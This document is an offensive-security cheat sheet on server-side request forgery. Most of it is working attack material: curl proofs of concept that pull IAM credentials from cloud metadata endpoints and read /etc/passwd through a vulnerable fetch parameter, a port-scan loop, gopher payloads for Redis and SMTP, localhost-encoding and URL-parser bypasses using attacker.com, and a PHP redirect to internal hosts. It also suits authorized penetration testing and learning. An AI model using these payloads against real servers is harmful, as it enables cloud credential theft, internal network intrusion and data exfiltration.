# SSRF (Server-Side Request Forgery)

> **Summary**: Attacker manipulates a server-side application into making HTTP/network requests to an unintended destination, such as internal services or cloud metadata APIs.
> **Impact**: Internal network reconnaissance, access to cloud credentials (IAM keys), reading local files, RCE via internal services, bypassing firewalls/ACLs.
> **Typical Severity**: High | Critical

---

## Detection

### Indicators
- Application fetches URLs provided by the user (import from URL, webhooks, PDF generators, image proxies)
- Server makes outbound requests based on user input (URL parameters, file paths, hostnames)
- Referrer header, SNI field, or redirect targets processed server-side
- Response contains internal hostnames, IPs, or error messages from backend services

### Automated Detection
```bash
# Interactsh - detect out-of-band interactions
# https://github.com/projectdiscovery/interactsh
interactsh-client

# Burp Collaborator Everywhere - detect blind SSRF via headers
# Install via BApp Store, triggers on Referer, Origin, X-Forwarded-For, etc.
```

### Manual Detection
1. Identify parameters that accept URLs or hostnames (e.g., `url=`, `callback=`, `redirect=`, `dest=`, `uri=`, `path=`, `img=`, `src=`)
2. Replace the value with a Burp Collaborator / interactsh URL
3. Check for DNS lookup, HTTP callback, or different response times
4. Test file:// and other protocols for broader SSRF confirmation

---

## Exploitation

### Prerequisites
- Application accepts a URL/hostname/IP from user input
- Server-side code fetches or connects to the supplied address
- Insufficient validation of the destination (no allowlist, or bypassable blocklist)

### SSRF Types

| Type | Description | Detection |
|------|-------------|-----------|
| Basic SSRF | Response from internal request returned to attacker | Content in response |
| Blind SSRF | Request is made but response is not returned | OOB callback (DNS/HTTP) |
| Partial SSRF | Only part of the URL is controllable | Limited exploitation |

### Step-by-Step

1. **Identify the injection point** - find where the application accepts URLs or makes server-side requests
2. **Confirm SSRF** - point the request to an external callback server (Burp Collaborator, interactsh)
3. **Test protocol support** - try `http://`, `https://`, `file://`, `gopher://`, `dict://`
4. **Access internal services** - request `http://127.0.0.1`, `http://169.254.169.254`, internal IPs
5. **Exfiltrate data** - cloud metadata, internal service responses, local files
6. **Escalate** - use retrieved credentials for lateral movement

**Success criteria**: Ability to make the server request internal resources or exfiltrate internal data

### Protocols

| Protocol | Usage | Example |
|----------|-------|---------|
| `http://` | Standard web requests to internal services | `http://127.0.0.1/admin` |
| `file://` | Read local files | `file:///etc/passwd` |
| `gopher://` | Craft raw TCP payloads (SMTP, Redis, MySQL) | `gopher://127.0.0.1:6379/_INFO` |
| `dict://` | Interact with DICT protocol services | `dict://<HOST>:<PORT>/info` |
| `sftp://` | Connect to SFTP servers | `sftp://<HOST>:22/` |
| `tftp://` | Send UDP TFTP requests | `tftp://<HOST>:69/file` |
| `ldap://` | Interact with LDAP services | `ldap://localhost:389/` |

### Gopher Protocol for Internal Service Exploitation
Use [Gopherus](https://github.com/tarunkant/Gopherus) to generate payloads for:
- **Redis**: Write webshell, cron job, or SSH keys
- **MySQL**: Execute queries as unauthenticated user
- **SMTP**: Send forged emails
- **FastCGI**: Execute PHP code

```bash
# Gopher HTTP request
gopher://<SERVER>:8080/_GET%20/%20HTTP/1.0%0A%0A

# Gopher POST request
gopher://<SERVER>:8080/_POST%20/admin%20HTTP/1.0%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2013%0A%0Aparam%3Dvalue
```

### Cloud Metadata Endpoints

#### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
```

> IMDSv2 requires a PUT request with `X-aws-ec2-metadata-token-ttl-seconds` header to get a token first, making it harder to exploit via basic SSRF. It also blocks requests with `X-Forwarded-For` header and has hop limit of 1.

#### AWS ECS
```
http://169.254.170.2/v2/credentials/<GUID>
# GUID from: file:///proc/self/environ (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
```

#### AWS Lambda
```
file:///proc/self/environ
# Contains: AWS_SESSION_TOKEN, AWS_SECRET_ACCESS_KEY, AWS_ACCESS_KEY_ID
http://localhost:9001/2018-06-01/runtime/invocation/next
```

#### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

#### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

#### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
```

**DNS shortcuts via interactsh:**
```
aws.interact.sh       -> 169.254.169.254
alibaba.interact.sh   -> 100.100.100.200
```

### Proof of Concept
```bash
# Basic SSRF to read cloud credentials
curl "https://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>"

# File read
curl "https://<TARGET>/fetch?url=file:///etc/passwd"

# Port scan
for port in 80 443 8080 3306 6379 27017; do
  curl "https://<TARGET>/fetch?url=http://127.0.0.1:$port" -o /dev/null -w "%{http_code} port:$port\n" -s
done
```

---

## Bypasses

### Localhost Obfuscation
```
127.0.0.1                         # Standard
127.1                             # Shortened
127.0.0.0 - 127.255.255.255      # Entire /8 block
0.0.0.0                           # All zeros
0                                 # Just zero
2130706433                        # Decimal (127.0.0.1)
0x7f000001                        # Hex
0177.0000.0000.0001               # Octal
0x7f.0x0.0x0.0x1                  # Dotted hex
017700000001                      # Full octal
::1                               # IPv6 loopback
0:0:0:0:0:0:0:1                   # IPv6 expanded
::ffff:127.0.0.1                  # IPv4-mapped IPv6
0:0:0:0:0:ffff:7f000001           # IPv4-mapped IPv6 hex
127.000000000000000.1             # Padded with zeros
```

### Mixed Encoding
```
0xA9.254.0251.0376                # Hex + decimal + octal
169.254.43518                     # Partial decimal (Class B)
```

### DNS Resolution Bypass
```bash
# Domains that resolve to 127.0.0.1
localtest.me
spoofed.burpcollaborator.net
127.0.0.1.nip.io
customer1.app.localhost.my.company.127.0.0.1.nip.io
```

### DNS Rebinding
A hostname alternates between a safe IP and an internal IP with very low TTL. The server validates the first resolution (safe), then the second resolution (internal) is used for the actual request.

Tool: [rebinder](https://lock.cmpxchg8b.com/rebinder.html)

### HTTP Redirect Bypass
Host a redirect on your server that points to the internal target:
```php
<?php header('Location: http://127.0.0.1/admin'); ?>
```
Then supply `http://<YOUR_SERVER>/redirect.php` as the URL.

### URL Parser Differentials
```
https://attacker.com@127.0.0.1    # Userinfo before host
http://127.0.0.1#@attacker.com    # Fragment confusion
http://127.0.0.1%2523@attacker.com
https:/attacker.com               # Missing slash
http:/\/\attacker.com             # Backslash tricks
```

### Enclosed Alphanumerics (Unicode)
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```
Convert at: [Unicode Converter](http://qaz.wtf/u/convert.cgi)

### SSRF via Non-Standard Vectors
- **Referrer header**: analytics software may fetch URLs from the Referer header
- **SNI field**: misconfigured Nginx `proxy_pass $ssl_preread_server_name` can be SSRF'd via TLS SNI
- **SVG/XML uploads**: embedded `<image xlink:href="http://internal/">` in SVG files
- **PDF generation**: HTML-to-PDF converters that fetch external resources
- **Webhook features**: application allows setting callback URLs

### IP Converter Tool
[https://h.43z.one/ipconverter/](https://h.43z.one/ipconverter/)

### Redirect Service
[https://ssrf.localdomain.pw](https://ssrf.localdomain.pw/)
```
https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
```

### Curl URL Globbing (WAF Bypass)
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

---

## Escalation
- **Cloud credential theft**: use SSRF to access metadata services, retrieve IAM keys, escalate in cloud
- **Internal service exploitation**: access Redis, Elasticsearch, Kubernetes API, Docker API
- **RCE via Gopher**: send crafted payloads to internal services (Redis SLAVEOF, FastCGI, SMTP)
- **Pivot to internal network**: use the server as a proxy to scan and exploit internal hosts
- **Data exfiltration**: read configuration files, environment variables, database credentials
- Chain with: [Open Redirect](open-redirect.md), [XXE](xxe.md), [LFI](lfi.md)

---

## Tools

| Tool | Usage |
|------|-------|
| [Gopherus](https://github.com/tarunkant/Gopherus) | Generate gopher payloads for Redis, MySQL, SMTP, FastCGI |
| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | Automated SSRF exploitation framework |
| [Interactsh](https://github.com/projectdiscovery/interactsh) | OOB interaction detection |
| [Burp Collaborator](https://portswigger.net/) | Detect blind SSRF via DNS/HTTP callbacks |
| [Collaborator Everywhere](https://portswigger.net/bappstore) | Burp extension for header-based SSRF |
| [Burp-Encode-IP](https://github.com/e1abrador/Burp-Encode-IP) | IP encoding bypass automation |
| [malicious-pdf](https://github.com/jonaslejon/malicious-pdf) | `python3 malicious-pdf.py <CALLBACK_URL>` |
| [sslip.io](https://sslip.io/) | Wildcard DNS for IP-based subdomains |
| [nip.io](https://nip.io/) | DNS wildcard for any IP |

---

## References

| URL | Description |
|-----|-------------|
| [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) | Comprehensive SSRF methodology |
| [PortSwigger SSRF](https://portswigger.net/web-security/ssrf) | SSRF labs and learning |
| [AllThingsSSRF](https://github.com/jdonsec/AllThingsSSRF) | SSRF resource collection |
| [Blind SSRF Chains](https://github.com/assetnote/blind-ssrf-chains) | Exploiting blind SSRF with internal services |
| [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) | Payload repository |
| [Automating SSRF Discovery](https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962) | Burp-based SSRF automation |
| [Cloud Metadata SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf) | Cloud-specific SSRF techniques |
| [URL Format Bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) | IP and URL encoding bypasses |
